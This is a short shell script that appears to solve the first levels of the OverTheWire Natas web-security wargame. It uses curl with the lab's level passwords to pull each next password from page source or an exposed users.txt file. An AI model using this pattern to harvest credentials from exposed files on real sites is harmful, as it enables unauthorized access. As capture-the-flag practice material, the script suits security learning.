#!/bin/sh

#Alternative curl -s http://natas0.natas.labs.overthewire.org -H "Authorization: Basic bmF0YXMwOm5hdGFzMA==" | grep natas1 | cut -d " " -f 6
#curl -s http://natas1.natas.labs.overthewire.org --user natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto | grep natas2 | cut -d " " -f 6

curl -s http://natas2.natas.labs.overthewire.org/files/users.txt --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi | grep natas3 | cut -d ":" -f 2

